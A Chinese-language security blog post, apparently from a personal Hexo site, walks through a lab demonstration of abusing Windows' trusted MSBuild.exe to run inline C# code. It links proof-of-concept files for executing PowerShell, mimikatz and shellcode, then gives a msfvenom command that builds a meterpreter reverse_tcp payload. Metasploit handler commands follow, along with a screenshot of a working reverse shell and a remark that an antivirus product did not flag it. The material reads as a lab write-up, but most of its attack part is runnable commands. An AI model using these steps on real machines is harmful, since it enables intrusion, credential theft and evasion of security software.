@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows白加黑">
+<meta property="og:url" content="http://www.cuittk.cn/2019/12/19/Windows白加黑/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/3-1.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/3-2.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/3-3.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png">
+<meta property="og:updated_time" content="2020-01-14T08:16:44.531Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows白加黑">
+<meta name="twitter:description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2019/12/19/Windows白加黑/"/>
+
+
+
+
+
+  <title>Windows白加黑 | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2019/12/19/Windows白加黑/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Windows白加黑</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-19T14:47:19+08:00">
+                2019-12-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Windows白加黑"><a href="#Windows白加黑" class="headerlink" title="Windows白加黑"></a>Windows白加黑</h2><p>攻击机：Kali Linux ：172.16.1.130<br>受害机：Win 7_64位：172.16.1.135</p>
+<h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台<br>MSBuild可在未安装Visual Studio的环境中编译.net的工程文件<br>MSBuild可编译特定格式的xml文件<br>更多基本知识可参照以下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd393574.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd393574.aspx</a></p>
+<h4 id="扩展用法"><a href="#扩展用法" class="headerlink" title="扩展用法"></a>扩展用法</h4><p>在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码<br>详细介绍可参考如下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396</a></p>
+<h5 id="HelloWorld示例"><a href="#HelloWorld示例" class="headerlink" title="HelloWorld示例"></a>HelloWorld示例</h5><p>以下代码保存为helloworld:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;</div><div class="line">  &lt;Target Name=&quot;Hello&quot;&gt;</div><div class="line">   &lt;HelloWorld /&gt;</div><div class="line">  &lt;/Target&gt;</div><div class="line">  &lt;UsingTask</div><div class="line">    TaskName=&quot;HelloWorld&quot;</div><div class="line">    TaskFactory=&quot;CodeTaskFactory&quot;</div><div class="line">    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</div><div class="line">    &lt;ParameterGroup/&gt;</div><div class="line">    &lt;Task&gt;</div><div class="line">      &lt;Using Namespace=&quot;System&quot; /&gt;  </div><div class="line">      &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;</div><div class="line">        &lt;![CDATA[</div><div class="line">			    Console.WriteLine(&quot;Hello World&quot;);		</div><div class="line">        ]]&gt;</div><div class="line">      &lt;/Code&gt;</div><div class="line">    &lt;/Task&gt;</div><div class="line">    &lt;/UsingTask&gt;</div><div class="line">&lt;/Project&gt;</div></pre></td></tr></table></figure></p>
+<p>注：保存的文件名可以任意<br>cmd下执行：<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld</code><br>cmd输出helloworld，如图：<br><img src="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png" alt=""></p>
+<h5 id="执行powershell命令"><a href="#执行powershell命令" class="headerlink" title="执行powershell命令"></a>执行powershell命令</h5><p>可参照三好师傅分享的POC，地址如下：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a><br>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-1.png" alt=""><br>标记1TaskName可修改，但两个位置的名称需要对应<br>标记2为固定格式:<code>TaskFactory=&quot;CodeTaskFactory&quot;</code><br>标记3的路径在不同系统可能会有区别，准确的为：<br><code>$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll</code><br>系统默认安装路径为:<br><code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</code><br>标记4为一个简单的输出helloworld实例<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-2.png" alt=""><br>标记5为固定格式，定义为<code>public class ClassExample : Task, ITask</code><br>下载executes%20PowerShellCommands.xml重命名为：c<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c</code><br>实际测试POC如图,成功执行powershell命令<br><img src="http://img.cdn.cuittk.cn/3-3.png" alt=""></p>
+<h5 id="执行PE文件"><a href="#执行PE文件" class="headerlink" title="执行PE文件"></a>执行PE文件</h5><p>下载<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</a><br>重命名为：aa，本环境只能用64位的.net Framework加载<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa</code><br><img src="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png" alt=""></p>
+<h5 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h5><p>下载32位shellcode，需要使用32位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a><br>重命名为dd<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe dd</code><br><img src="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png" alt=""></p>
+<p>下载64位shellcode，需要使用64位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>重命名为ee<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ee</code><br>64位的能执行shellcode，但是会报错。<br><img src="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png" alt=""></p>
+<p>我们这里用64位的shellcode和64位的win7来操作。<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp</code><br>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.118.134</div><div class="line">set LPORT 4444</div><div class="line">set ExitOnSession false</div><div class="line">set autorunscript migrate -n explorer.exe</div><div class="line">exploit -j</div></pre></td></tr></table></figure></p>
+<p>Meterprefer 使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. background 挂入后台session</div><div class="line">2. sessions 查看现有的后台  session</div><div class="line">3. sessions -i 1 查看后台session id为1</div></pre></td></tr></table></figure></p>
+<p>成功反弹msf，可以执行命令<br><img src="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png" alt=""></p>
+<p>某管家没有报毒<br><img src="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png" alt=""></p>
+<h5 id="遇到的沙雕问题"><a href="#遇到的沙雕问题" class="headerlink" title="遇到的沙雕问题"></a>遇到的沙雕问题</h5><p>复制shellcode报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">生成失败。</div><div class="line"></div><div class="line">“C:\test\ee_1”(默认目标) (1) -&gt;</div><div class="line">(Hello 目标) -&gt;</div><div class="line">  C:\test\ee_1(8,5): error : 此编译的源文件可以在以下位置找到:“C:\Users\test\AppData\Local\Temp\a10919e0-6aea-4146-85f5-4f5959c7a4b8.txt”</div><div class="line">C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(65,57) : error CS0103: 当前上下文中不存在名称“shellcode”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,28) : error CS0103: 当前上下文中不存在名称“shellcode”</div><div class="line">C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,62) : error CS0103: 当前上下文中不存在名称“shellcode”</div><div class="line"> C:\test\ee_1(8,5): error MSB4036: 未找到“ClassExample”任务。请检查下列各项:1.) 项目文件中的任务名称与任务类的名称相同。2.) 任务类为“public”且实现 Microsoft.Build.Framework.ITask接口。3.) 在项目文件中或位于“C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录的 *.tasks 文件中使用 &lt;UsingTask&gt; 正确声明了该任务。</div><div class="line">    0 个警告</div><div class="line">    5 个错误</div><div class="line"></div><div class="line">已用时间 00:00:00.31</div></pre></td></tr></table></figure></p>
+<p>我直接复制的shellcode，是<code>byte[] buf = new byte[510] {</code>开头，<br>模板中是<code>byte[] shellcode = new byte[276] {</code>，太不仔细了。严格只覆盖等号后面的内容。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/</a><br><a href="https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91" target="_blank" rel="external">https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/13/android渗透测试从0开始/" rel="next" title="android渗透测试从0开始">
+                <i class="fa fa-chevron-left"></i> android渗透测试从0开始
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/10/mysql limit注入/" rel="prev" title="mysql limit注入">
+                mysql limit注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows白加黑"><span class="nav-number">1.</span> <span class="nav-text">Windows白加黑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSBuild"><span class="nav-number">1.1.</span> <span class="nav-text">MSBuild</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">1.1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扩展用法"><span class="nav-number">1.1.2.</span> <span class="nav-text">扩展用法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HelloWorld示例"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">HelloWorld示例</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行powershell命令"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">执行powershell命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行PE文件"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">执行PE文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行shellcode"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">执行shellcode</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#遇到的沙雕问题"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">遇到的沙雕问题</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言',
+		avatar: 'mm',
+		recordIP: 'true'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
